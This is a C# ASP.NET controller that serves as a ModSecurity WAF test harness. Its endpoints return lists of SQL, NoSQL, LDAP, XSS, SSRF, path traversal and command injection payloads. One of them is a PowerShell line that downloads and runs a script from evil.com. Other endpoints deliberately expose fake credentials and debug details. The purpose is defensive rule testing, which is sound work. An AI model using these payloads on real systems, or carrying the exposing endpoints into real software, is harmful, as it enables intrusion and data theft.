using Microsoft.AspNetCore.Mvc;
using System.ComponentModel.DataAnnotations;
using System.Text.Json;
using System.Text;

namespace ModSecPoc.Controllers;

[ApiController]
[Route("api/[controller]")]
public class SecurityRulesTestController : ControllerBase
{
    private readonly ILogger<SecurityRulesTestController> _logger;

    public SecurityRulesTestController(ILogger<SecurityRulesTestController> logger)
    {
        _logger = logger;
    }

    /// <summary>
    /// Test endpoint that should trigger ModSecurity rules and return test results
    /// </summary>
    [HttpGet("health")]
    public IActionResult Health()
    {
        return Ok(new { 
            Message = "Security Rules Test Controller is running",
            Timestamp = DateTime.UtcNow,
            Status = "Healthy"
        });
    }

    // =============================================================================
    // SQL/NoSQL/LDAP Injection Tests (Rules 1001-1004)
    // =============================================================================

    /// <summary>
    /// Test SQL Injection Detection (Rule ID: 1001, 1002)
    /// Expected: ModSecurity should block these requests
    /// </summary>
    [HttpGet("test-sql-injection")]
    public IActionResult TestSqlInjection([FromQuery] string? payload = null)
    {
        _logger.LogWarning("SQL Injection test endpoint accessed with payload: {Payload}", payload);
        
        var testPayloads = new[]
        {
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1' UNION SELECT username,password FROM admin --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 'x'='x",
            "1'; EXEC xp_cmdshell('dir'); --"
        };

        return Ok(new
        {
            Message = "SQL Injection test completed",
            TestPayload = payload,
            CommonPayloads = testPayloads,
            Warning = "If you can see this response, ModSecurity rules may not be working properly for SQL injection"
        });
    }

    [HttpPost("test-sql-injection-post")]
    public IActionResult TestSqlInjectionPost([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("SQL Injection POST test with payload: {Payload}", request.Payload);
        
        return Ok(new
        {
            Message = "SQL Injection POST test completed",
            ReceivedPayload = request.Payload,
            Warning = "If you can see this response, ModSecurity rules may not be working properly"
        });
    }

    /// <summary>
    /// Test NoSQL Injection Detection (Rule ID: 1003)
    /// </summary>
    [HttpPost("test-nosql-injection")]
    public IActionResult TestNoSqlInjection([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("NoSQL Injection test with payload: {Payload}", request.Payload);

        var testPayloads = new[]
        {
            "{\"$where\":\"this.credits == this.debits\"}",
            "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
            "{\"$or\":[{\"username\":\"admin\"},{\"username\":\"administrator\"}]}",
            "'; return db.collection.find(); var dummy='",
            "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}"
        };

        return Ok(new
        {
            Message = "NoSQL Injection test completed",
            TestPayload = request.Payload,
            CommonPayloads = testPayloads,
            Warning = "If you can see this response, ModSecurity NoSQL injection rules may not be working"
        });
    }

    /// <summary>
    /// Test LDAP Injection Detection (Rule ID: 1004)
    /// </summary>
    [HttpGet("test-ldap-injection")]
    public IActionResult TestLdapInjection([FromQuery] string? filter = null)
    {
        _logger.LogWarning("LDAP Injection test with filter: {Filter}", filter);

        var testPayloads = new[]
        {
            "*",
            ")(cn=*",
            "admin*",
            "(&(objectClass=user)(cn=*))",
            ")(|(password=*)(uid=*))"
        };

        return Ok(new
        {
            Message = "LDAP Injection test completed",
            TestFilter = filter,
            CommonPayloads = testPayloads,
            Warning = "If you can see this response, ModSecurity LDAP injection rules may not be working"
        });
    }

    // =============================================================================
    // Cross-Site Scripting (XSS) Tests (Rules 2001-2003)
    // =============================================================================

    /// <summary>
    /// Test XSS Detection (Rule ID: 2001, 2002, 2003)
    /// </summary>
    [HttpGet("test-xss")]
    public IActionResult TestXss([FromQuery] string? script = null)
    {
        _logger.LogWarning("XSS test with script: {Script}", script);

        var testPayloads = new[]
        {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "data:text/html,<script>alert('XSS')</script>",
            "<script>document.write('XSS')</script>",
            "eval('alert(1)')",
            "setTimeout('alert(1)', 0)"
        };

        return Ok(new
        {
            Message = "XSS test completed",
            TestScript = script,
            CommonPayloads = testPayloads,
            Warning = "If you can see this response, ModSecurity XSS rules may not be working"
        });
    }

    [HttpPost("test-xss-post")]
    public IActionResult TestXssPost([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("XSS POST test with payload: {Payload}", request.Payload);

        return Ok(new
        {
            Message = "XSS POST test completed",
            ReceivedPayload = request.Payload,
            Warning = "If you can see this response, ModSecurity XSS rules may not be working"
        });
    }

    // =============================================================================
    // CSRF Tests (Rules 3001-3002)
    // =============================================================================

    /// <summary>
    /// Test CSRF Protection (Rule ID: 3001, 3002)
    /// This endpoint expects CSRF token validation
    /// </summary>
    [HttpPost("test-csrf-protection")]
    public IActionResult TestCsrfProtection([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("CSRF test without proper token validation");

        // Check for CSRF token headers or form fields
        var hasCSRFHeader = Request.Headers.ContainsKey("X-CSRF-Token");
        var hasCSRFForm = Request.HasFormContentType && Request.Form.ContainsKey("__RequestVerificationToken");
        
        return Ok(new
        {
            Message = "CSRF test completed",
            HasCSRFHeader = hasCSRFHeader,
            HasCSRFForm = hasCSRFForm,
            RequestMethod = Request.Method,
            Referer = Request.Headers.Referer.ToString(),
            Warning = "If you can access this without CSRF token, the protection may not be working"
        });
    }

    [HttpPut("test-csrf-state-change")]
    public IActionResult TestCsrfStateChange([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("State-changing operation without CSRF protection");
        
        return Ok(new
        {
            Message = "State change operation completed",
            Operation = "UPDATE",
            Warning = "This state-changing operation should require CSRF protection"
        });
    }

    // =============================================================================
    // SSRF Tests (Rules 4001-4003)
    // =============================================================================

    /// <summary>
    /// Test SSRF Protection (Rule ID: 4001, 4002, 4003)
    /// </summary>
    [HttpPost("test-ssrf")]
    public IActionResult TestSsrf([FromBody] UrlTestRequest request)
    {
        _logger.LogWarning("SSRF test with URL: {Url}", request.Url);

        var dangerousUrls = new[]
        {
            "http://127.0.0.1:8080/admin",
            "http://localhost/internal",
            "http://10.0.0.1/secrets",
            "http://192.168.1.1/config",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "ftp://internal.server.com/data",
            "gopher://localhost:70/",
            "dict://127.0.0.1:11211/stats"
        };

        return Ok(new
        {
            Message = "SSRF test completed",
            TestUrl = request.Url,
            DangerousUrls = dangerousUrls,
            Warning = "If you can see this response with internal URLs, SSRF protection may not be working"
        });
    }

    // =============================================================================
    // Insecure Deserialization Tests (Rules 5001-5003)
    // =============================================================================

    /// <summary>
    /// Test Insecure Deserialization Protection (Rule ID: 5001, 5002, 5003)
    /// </summary>
    [HttpPost("test-deserialization")]
    public IActionResult TestDeserialization([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("Deserialization test with payload: {Payload}", request.Payload);

        var dangerousPatterns = new[]
        {
            "System.Runtime.Serialization",
            "BinaryFormatter",
            "ObjectStateFormatter",
            "$type\":\"System.Diagnostics.Process",
            "$type\":\"System.Windows.Data.ObjectDataProvider",
            "__VIEWSTATE with suspicious content",
            "System.ComponentModel.Design.Serialization"
        };

        return Ok(new
        {
            Message = "Deserialization test completed",
            TestPayload = request.Payload,
            DangerousPatterns = dangerousPatterns,
            Warning = "If you can see this response with dangerous serialization patterns, protection may not be working"
        });
    }

    [HttpPost("test-viewstate-tampering")]
    public IActionResult TestViewStateTampering([FromForm] string? __VIEWSTATE = null)
    {
        _logger.LogWarning("ViewState tampering test with ViewState: {ViewState}", __VIEWSTATE);

        return Ok(new
        {
            Message = "ViewState test completed",
            ReceivedViewState = __VIEWSTATE,
            Warning = "ViewState tampering detection should prevent malicious ViewState manipulation"
        });
    }

    // =============================================================================
    // File Upload Tests (Rules 6001-6003)
    // =============================================================================

    /// <summary>
    /// Test File Upload Security (Rule ID: 6001, 6002, 6003)
    /// </summary>
    [HttpPost("test-file-upload")]
    public async Task<IActionResult> TestFileUpload(IFormFile? file)
    {
        if (file == null)
        {
            return BadRequest(new { Message = "No file uploaded for testing" });
        }

        _logger.LogWarning("File upload test with file: {FileName}", file.FileName);

        var dangerousExtensions = new[]
        {
            ".exe", ".bat", ".cmd", ".com", ".scr", ".vbs", ".js", 
            ".asp", ".aspx", ".php", ".jsp", ".py", ".sh", ".ps1"
        };

        // Read file content for web shell detection
        string content = "";
        if (file.Length < 10000) // Only read small files for testing
        {
            using var reader = new StreamReader(file.OpenReadStream());
            content = await reader.ReadToEndAsync();
        }

        return Ok(new
        {
            Message = "File upload test completed",
            FileName = file.FileName,
            FileSize = file.Length,
            ContentType = file.ContentType,
            HasDangerousExtension = dangerousExtensions.Any(ext => file.FileName?.EndsWith(ext, StringComparison.OrdinalIgnoreCase) == true),
            ContentPreview = content.Length > 100 ? content.Substring(0, 100) + "..." : content,
            DangerousExtensions = dangerousExtensions,
            Warning = "If dangerous files are accepted, upload security rules may not be working"
        });
    }

    // =============================================================================
    // Command Injection Tests (Rules 7001-7003)
    // =============================================================================

    /// <summary>
    /// Test Command Injection Protection (Rule ID: 7001, 7002, 7003)
    /// </summary>
    [HttpPost("test-command-injection")]
    public IActionResult TestCommandInjection([FromBody] CommandTestRequest request)
    {
        _logger.LogWarning("Command injection test with command: {Command}", request.Command);

        var dangerousCommands = new[]
        {
            "ls -la; cat /etc/passwd",
            "dir & net user",
            "ping 127.0.0.1 | whoami",
            "$(cat /etc/hosts)",
            "`id`",
            "powershell.exe -Command Get-Process",
            "cmd.exe /c dir",
            "bash -c 'ls -la'",
            "/bin/sh -c ls",
            "net user admin password123 /add"
        };

        return Ok(new
        {
            Message = "Command injection test completed",
            TestCommand = request.Command,
            DangerousCommands = dangerousCommands,
            Warning = "If you can see this response with command injection payloads, protection may not be working"
        });
    }

    [HttpPost("test-powershell-injection")]
    public IActionResult TestPowerShellInjection([FromBody] TestPayloadRequest request)
    {
        _logger.LogWarning("PowerShell injection test with payload: {Payload}", request.Payload);

        var psPayloads = new[]
        {
            "Invoke-Expression 'Get-Process'",
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
            "Start-Process calc.exe",
            "Get-WmiObject -Class Win32_Process",
            "powershell -EncodedCommand <base64>"
        };

        return Ok(new
        {
            Message = "PowerShell injection test completed",
            TestPayload = request.Payload,
            PowerShellPayloads = psPayloads,
            Warning = "PowerShell injection protection should block these commands"
        });
    }

    // =============================================================================
    // Path Traversal Tests (Rules 8001-8003)
    // =============================================================================

    /// <summary>
    /// Test Path Traversal Protection (Rule ID: 8001, 8002, 8003)
    /// </summary>
    [HttpGet("test-path-traversal")]
    public IActionResult TestPathTraversal([FromQuery] string? path = null)
    {
        _logger.LogWarning("Path traversal test with path: {Path}", path);

        var dangerousPaths = new[]
        {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "web.config",
            "..\\..\\web.config",
            "/app_data/database.mdf",
            "bin/ModSecPoc.dll",
            "\\\\server\\share\\file.txt"
        };

        return Ok(new
        {
            Message = "Path traversal test completed",
            TestPath = path,
            DangerousPaths = dangerousPaths,
            Warning = "If you can access this with path traversal payloads, protection may not be working"
        });
    }

    [HttpGet("test-sensitive-files")]
    public IActionResult TestSensitiveFiles([FromQuery] string? file = null)
    {
        _logger.LogWarning("Sensitive file access test: {File}", file);

        var sensitiveFiles = new[]
        {
            "web.config",
            "appsettings.json",
            "appsettings.Development.json",
            "connectionstrings.config",
            "machine.config",
            "global.asax",
            "app.config"
        };

        return Ok(new
        {
            Message = "Sensitive file access test completed",
            TestFile = file,
            SensitiveFiles = sensitiveFiles,
            Warning = "Access to sensitive .NET files should be blocked"
        });
    }

    // =============================================================================
    // Security Misconfiguration Tests (Rules 9001-9003)
    // =============================================================================

    /// <summary>
    /// Test Information Disclosure Detection (Rule ID: 9001, 9002, 9003)
    /// This endpoint intentionally returns sensitive information to test detection
    /// </summary>
    [HttpGet("test-information-disclosure")]
    public IActionResult TestInformationDisclosure()
    {
        _logger.LogWarning("Information disclosure test endpoint accessed");

        // This should trigger information disclosure rules
        var sensitiveInfo = new
        {
            Message = "Debug information exposed",
            StackTrace = "at System.Exception.ThrowHelper.ThrowArgumentNullException(String parameter)",
            ExceptionDetails = "System.ArgumentNullException: Value cannot be null",
            ConnectionString = "Server=localhost;Database=testdb;User Id=sa;Password=secret123;",
            ServerInfo = new
            {
                Server = "Microsoft-IIS/10.0",
                AspNetVersion = "4.8.4084.0",
                PoweredBy = "ASP.NET"
            },
            DebugMode = true,
            CompilationDebug = "true",
            CustomErrorsMode = "Off",
            TraceEnabled = true
        };

        // Set headers that should trigger detection
        Response.Headers.Add("Server", "Microsoft-IIS/10.0");
        Response.Headers.Add("X-Powered-By", "ASP.NET");
        Response.Headers.Add("X-AspNet-Version", "4.8.4084.0");

        return Ok(sensitiveInfo);
    }

    [HttpGet("test-server-error")]
    public IActionResult TestServerError()
    {
        _logger.LogWarning("Server error test - intentional 500 error");
        
        // Simulate an unhandled exception
        Response.StatusCode = 500;
        return StatusCode(500, new
        {
            Error = "Runtime Error",
            Message = "Server Error - Unhandled Exception",
            Details = "500 - Internal Server Error",
            Exception = "System.NullReferenceException: Object reference not set to an instance of an object"
        });
    }

    // =============================================================================
    // Sensitive Data Exposure Tests (Rules 10001-10004)
    // =============================================================================

    /// <summary>
    /// Test Sensitive Data Exposure Detection (Rule ID: 10001, 10002, 10003, 10004)
    /// This endpoint returns various sensitive data patterns to test detection
    /// </summary>
    [HttpGet("test-data-leakage")]
    public IActionResult TestDataLeakage()
    {
        _logger.LogWarning("Data leakage test endpoint accessed");

        // This should trigger sensitive data exposure rules
        var sensitiveData = new
        {
            Message = "Sensitive data exposure test",
            CreditCards = new[]
            {
                "4111-1111-1111-1111",  // Visa
                "5555-5555-5555-4444",  // MasterCard
                "3782-822463-10005"     // American Express
            },
            SSNs = new[]
            {
                "123-45-6789",
                "987-65-4321"
            },
            ConnectionStrings = new[]
            {
                "Server=prod-server;Database=CustomerDB;User ID=admin;Password=P@ssw0rd123;",
                "Data Source=localhost;Initial Catalog=Orders;Integrated Security=false;User Id=dbuser;Password=secret;"
            },
            ApiCredentials = new
            {
                ApiKey = "ak_live_1234567890abcdefghijklmnop",
                SecretKey = "sk_test_abcdef1234567890ghijklmnop",
                AccessToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                BearerToken = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9"
            }
        };

        return Ok(sensitiveData);
    }

    // =============================================================================
    // Comprehensive Security Test Suite
    // =============================================================================

    /// <summary>
    /// Run all security tests and return a comprehensive report
    /// </summary>
    [HttpGet("run-all-tests")]
    public IActionResult RunAllTests()
    {
        _logger.LogWarning("Running comprehensive security test suite");

        var testResults = new
        {
            Message = "Comprehensive Security Test Suite Results",
            Timestamp = DateTime.UtcNow,
            TestCategories = new
            {
                InjectionTests = new
                {
                    SQLInjection = "Rules 1001-1002",
                    NoSQLInjection = "Rule 1003",
                    LDAPInjection = "Rule 1004",
                    Status = "If this response is visible, review injection protection"
                },
                XSSTests = new
                {
                    ReflectedXSS = "Rule 2001",
                    StoredXSS = "Rule 2002",
                    DOMBasedXSS = "Rule 2003",
                    Status = "If this response is visible, review XSS protection"
                },
                CSRFTests = new
                {
                    MissingToken = "Rule 3001",
                    SuspiciousReferer = "Rule 3002",
                    Status = "Test CSRF protection with state-changing operations"
                },
                SSRFTests = new
                {
                    InternalIPs = "Rule 4001",
                    MetadataServices = "Rule 4002",
                    DangerousProtocols = "Rule 4003",
                    Status = "If internal URLs work, review SSRF protection"
                },
                DeserializationTests = new
                {
                    BinaryFormatter = "Rule 5001",
                    ViewStateTampering = "Rule 5002",
                    JSONNETGadgets = "Rule 5003",
                    Status = "Review .NET deserialization protection"
                },
                FileUploadTests = new
                {
                    DangerousExtensions = "Rule 6001",
                    DoubleExtensions = "Rule 6002",
                    WebShellContent = "Rule 6003",
                    Status = "Test file upload restrictions"
                },
                CommandInjectionTests = new
                {
                    BasicCommands = "Rule 7001",
                    WindowsCommands = "Rule 7002",
                    PowerShellCommands = "Rule 7003",
                    Status = "Review command injection protection"
                },
                PathTraversalTests = new
                {
                    BasicTraversal = "Rule 8001",
                    WindowsPaths = "Rule 8002",
                    SensitiveFiles = "Rule 8003",
                    Status = "Review path traversal protection"
                },
                MisconfigurationTests = new
                {
                    DebugInfo = "Rule 9001",
                    VersionDisclosure = "Rule 9002",
                    ApplicationErrors = "Rule 9003",
                    Status = "Review information disclosure rules"
                },
                DataLeakageTests = new
                {
                    CreditCards = "Rule 10001",
                    SSNs = "Rule 10002",
                    ConnectionStrings = "Rule 10003",
                    APIKeys = "Rule 10004",
                    Status = "Review sensitive data exposure rules"
                }
            },
            Instructions = new
            {
                Message = "How to use this test suite",
                Steps = new[]
                {
                    "1. Access each test endpoint with malicious payloads",
                    "2. If ModSecurity is working, requests should be blocked",
                    "3. Check ModSecurity logs for rule triggers",
                    "4. Adjust anomaly thresholds if needed",
                    "5. Fine-tune rules to reduce false positives"
                }
            },
            Warning = "⚠️ If you can see this detailed response, it means the request was not blocked by ModSecurity. Check your configuration!"
        };

        return Ok(testResults);
    }
}

// Request models for testing
public class TestPayloadRequest
{
    [Required]
    public string Payload { get; set; } = string.Empty;
}

public class UrlTestRequest
{
    [Required]
    public string Url { get; set; } = string.Empty;
}

public class CommandTestRequest
{
    [Required]
    public string Command { get; set; } = string.Empty;
}